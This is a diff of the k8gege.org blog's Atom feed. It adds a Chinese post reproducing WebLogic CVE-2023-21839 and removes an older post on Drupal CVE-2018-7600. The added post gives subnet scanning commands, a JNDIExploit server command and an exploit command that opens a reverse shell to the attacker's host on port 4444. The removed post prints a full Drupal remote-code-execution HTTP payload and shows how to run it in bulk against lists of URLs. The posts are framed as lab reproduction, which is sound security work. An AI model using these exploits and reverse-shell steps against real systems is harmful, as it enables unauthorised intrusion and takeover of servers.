@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://k8gege.org/"/>
-  <updated>2023-03-25T14:34:02.410Z</updated>
+  <updated>2023-03-27T15:52:08.444Z</updated>
   <id>http://k8gege.org/</id>
   
   <author>
@@ -15,6 +15,35 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>〖EXP〗Ladon漏洞复现 CVE-2023-21839 Weblogic</title>
+    <link href="http://k8gege.org/p/CVE-2023-21839.html"/>
+    <id>http://k8gege.org/p/CVE-2023-21839.html</id>
+    <published>2023-03-27T14:10:00.000Z</published>
+    <updated>2023-03-27T15:52:08.444Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x00-实验环境"><a href="#0x00-实验环境" class="headerlink" title="0x00 实验环境"></a>0x00 实验环境</h3><p>攻击机：Windows</p><p>靶场：vulhub 12.2.1.3环境</p><h3 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h3><p>允许远程用户在未经授权的情况下通过 IIOP/T3 进行 JNDI lookup 操作，当 JDK 版本过低或本地存在小工具（javaSerializedData）时，这可能会导致 RCE 漏洞</p><p>WebLogic_Server = 12.2.1.3.0<br>WebLogic_Server = 12.2.1.4.0<br>WebLogic_Server = 14.1.1.0.0</p><h3 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h3><p>####（1）Ladon T3info模块探测 weblogic版本</p><p>探测到版本代表开启T3协议 版本符合可尝试是否存在漏洞</p><p>Ladon noping 192.168.188.2/24 T3info<br>Ladon 192.168.188.2:7001 T3info<br>Ladon <a href="http://192.168.188.2:7001" target="_blank" rel="noopener">http://192.168.188.2:7001</a>  T3info<br>Ladon url.txt T3info<br>Ladon noping ip.txt T3info<br>LadonGo对应模块为T3scan</p><p><img alt data-original="https://mmbiz.qpic.cn/mmbiz_png/ESAML7BuCW6NOBN94RVlzvibkBgt3opm1hEeO8nGRxSNhLAibtnNajiaL4GiasFlEZnlSpI870ZI3jzackRic6gss1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1"></p><p>相关搜索引擎导出url,然后批量检测T3协议</p><p>Ladon url.txt T3info &gt; T3ver.txt</p><p>当然也可以直接检测目标C段是否存在weblogic</p><p>Ladon noping ip24.txt T3info &gt; T3ver.txt<br>Ladon noping 192.168.1.8/24 T3info &gt; T3ver.txt</p><p>####（2）FindIP模块匹配目标</p><p>Key.txt存放LadonGUI处理的目标C段，当然手动也可以，使用</p><p>Ladon FindIP key.txt T3ver.txt</p><p>匹配C段是否出现在结果中，出现则有可能与目标有关，可以尝试GetShell</p><p>图片</p><p>####（3）使用网上开源工具<a href="https://github.com/4ra1n/CVE-2023-21839" target="_blank" rel="noopener">https://github.com/4ra1n/CVE-2023-21839</a></p><p>GO编译</p><p>go build -o CVE-2023-21839.exe</p><p>####（4）漏洞检测</p><p>通过Ladon监听，无需dnslog等，不会向第3方泄露授权检测站点漏洞信息，部署在目标内网也可解决目标内网不出网无法利用目标内网存在相关漏洞的问题。</p><h5 id="Ladon-监听命令："><a href="#Ladon-监听命令：" class="headerlink" title="Ladon 监听命令："></a>Ladon 监听命令：</h5><p>Ladon web 800</p><p>使用20230228后版本，不然批量LDAP时可能会崩溃</p><h5 id="exp测试漏洞"><a href="#exp测试漏洞" class="headerlink" title="exp测试漏洞"></a>exp测试漏洞</h5><p>exp.exe -ip 192.168.188.3 -port 7001 -ldap ldap://192.168.188.2:800</p><p>Ladon监听出现JNDI_LDAP字符串 代表存在JNDI注入漏洞</p><p>图片</p><p>####（4）反弹shell：</p><p>使用JNDI漏洞利用工具，在VPS开启服务，监听1389端口。</p><p>java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 192.168.188.2 -l 1389 -p 9999</p><p>####（5）在VPS上使用Ladon监听端口：</p><p>Ladon NC监听 4444</p><p>####（6）在渗透机上执行以下命令</p><p>CVE-2023-21839 -ip 192.168.188.3 -port 7001 -ldap ldap://192.168.188.2:1389/Basic/ReverseShell/192.168.188.2/4444</p><p>图片</p><p>####（7）成功getshell</p><p>接下来就可以执行任意命令，linux也可以使用自带NC监听，对于windows可使用PowerLadon内存加载后渗透。</p><p>图片</p><p>Ladon 10.9 20230302<br>[u]LadonExp     编译EXE支持执行CMD  Payload变量$cmd$ 变量$b64cmd$<br>[u]web         CS版不含该模块  识别JAVA  JNDI_LDAP  JNDI_RMI请求<br>[u]WebLogicPoc    CVE-2020-14883高危漏洞检测可识别出Windows或Linux<br>[-]PortTran      CS版移除 端口转发工具<br>[u]Ladon911      本地测试用的全功能版(即保留旧漏洞和一些过时功能)<br>[-]Help        仅911版保留    功能很多 建议看Wiki或Ladon Study<br>[-]SMBGhost      仅CS和911版保留 Win10默认自动更新，实战遇到概率低<br>[-]vsFTPdPoc    仅CS和911版保留 2011漏洞过旧，实战遇到概率低<br>[-]CVE-2021-36934  仅CS和911版保留 Win10默认自动更新，实战可用概率低<br>[-]PhpStudyPoc    仅CS和911版保留<br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/Ladn85Subdomain.PNG"></p><p>如果已整理好URL，可使用WhatCMS快速识别</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon url.txt WhatCMS</span><br></pre></td></tr></table></figure><p><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_WhatCMS.gif"></p><h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>911版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>10.10版本：K8小密圈</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;0x00-实验环境&quot;&gt;&lt;a href=&quot;#0x00-实验环境&quot; class=&quot;headerlink&quot; title=&quot;0x00 实验环境&quot;&gt;&lt;/a&gt;0x00 实验环境&lt;/h3&gt;&lt;p&gt;攻击机：Windows&lt;/p&gt;
+&lt;p&gt;靶场：vulhub 12.2.1.3环境&lt;/p
+      
+    
+    </summary>
+    
+    
+      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    
+      <category term="CVE-2023-21839" scheme="http://k8gege.org/tags/CVE-2023-21839/"/>
+    
+      <category term="Weblogic" scheme="http://k8gege.org/tags/Weblogic/"/>
+    
+  </entry>
   
   <entry>
     <title>〖工具〗LadonGo开源全平台内网渗透扫描器</title>
@@ -541,34 +570,6 @@ Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
     
     
       <category term="USB" scheme="http://k8gege.org/tags/USB/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>〖EXP〗Drupal远程执行漏洞复现&amp;Ladon批量利用</title>
-    <link href="http://k8gege.org/p/CVE-2018-7600.html"/>
-    <id>http://k8gege.org/p/CVE-2018-7600.html</id>
-    <published>2021-08-03T14:10:00.000Z</published>
-    <updated>2021-08-03T15:24:39.485Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Drupal是一个开源内容管理系统（CMS），全球超过100万个网站（包括政府，电子零售，企业组织，金融机构等）使用。两周前，Drupal安全团队披露了一个非常关键的漏洞，编号CVE-2018-7600 Drupal对表单请求内容未做严格过滤，因此，这使得攻击者可能将恶意注入表单内容，此漏洞允许未经身份验证的攻击者在默认或常见的Drupal安装上执行远程代码执行。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://research.checkpoint.com/uncovering-drupalgeddon-2/" target="_blank" rel="noopener">https://research.checkpoint.com/uncovering-drupalgeddon-2/</a></p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Drupal 6.x</p><p>Drupal 7.x</p><p>Drupal 8.x</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><a href="https://github.com/vulhub/vulhub/blob/master/drupal/CVE-2018-7600/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/drupal/CVE-2018-7600/README.zh-cn.md</a></p><p>漏洞环境</p><p>执行如下命令启动drupal 8.5.0的环境：</p><p>docker-compose up -d</p><p>环境启动后，访问<a href="http://your-ip:8080/将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。" target="_blank" rel="noopener">http://your-ip:8080/将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。</a></p><p><img alt data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2018-7600/0.PNG"></p><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 103</span><br><span class="line"></span><br><span class="line">form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[<span class="comment">#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=id</span></span><br></pre></td></tr></table></figure><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>使用LadonExp.exe生成POC，填写对应字段，具体参数如下</p><p>TargetURL: 目标URL<br>Addurl: /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax<br>Post:   form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=id</p><p>只需以上3个参数即可，点击BuildExe生成EXE，再点击TestEXE测试，如图所示成功执行ID命令。</p><p><img alt data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2018-7600/1.PNG"><br>PS：Payload中的exec也可换成system、passthru或其它PHP函数</p><h3 id="Ladon调用"><a href="#Ladon调用" class="headerlink" title="Ladon调用"></a>Ladon调用</h3><p>生成的POC或EXP可使用Ladon调用，单个URL用法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon http://192.168.1.8:8080 LadonPoc.exe</span><br></pre></td></tr></table></figure><p><img alt data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2018-7600/2.PNG"></p><h4 id="批量利用"><a href="#批量利用" class="headerlink" title="批量利用"></a>批量利用</h4><p>由于url不像ip那样可使用IP/24、IP/XX来批量，所以我们可配置url.txt来批量利用EXP。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon url.txt LadonPoc.exe</span><br></pre></td></tr></table></figure><p><img alt data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2018-7600/3.PNG"></p><h3 id="CMS识别"><a href="#CMS识别" class="headerlink" title="CMS识别"></a>CMS识别</h3><p>实战时可使用LadonGui的SubDomain来快速获取目标子域名并识别出使用Drupal的域名，再把对应URL放入url.txt，即可使用Ladon批量EXP。</p><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/Ladn85Subdomain.PNG"></p><p>如果已整理好URL，可使用WhatCMS快速识别</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon url.txt WhatCMS</span><br></pre></td></tr></table></figure><p><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_WhatCMS.gif"></p><h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>8.6版本：K8小密圈</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h3&gt;&lt;p&gt;Drupal是一个开源内容管理系统（CMS），全球超过100万个网站（包括政府，电子零售，企业组织，金融机构等）使用。两周前
-      
-    
-    </summary>
-    
-    
-      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
-    
-    
-      <category term="CVE-2018-7600" scheme="http://k8gege.org/tags/CVE-2018-7600/"/>
-    
-      <category term="Drupal" scheme="http://k8gege.org/tags/Drupal/"/>
     
   </entry>
   
